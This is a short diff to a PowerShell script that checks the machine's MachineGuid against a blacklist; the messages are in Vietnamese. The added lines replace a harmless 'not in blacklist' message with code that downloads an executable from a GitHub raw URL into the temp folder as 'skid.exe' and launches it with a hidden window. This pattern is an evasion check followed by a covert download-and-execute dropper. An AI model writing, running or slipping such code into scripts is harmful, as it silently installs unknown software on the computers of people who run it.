@@ -17,6 +17,7 @@ try {
 if ($machineGuids -contains $machineGuid) {
     Write-Host "MachineGuid có trong danh sách đen."
 } else {
-    Write-Host "MachineGuid không có trong danh sách đen."
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
+    Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
 }
 
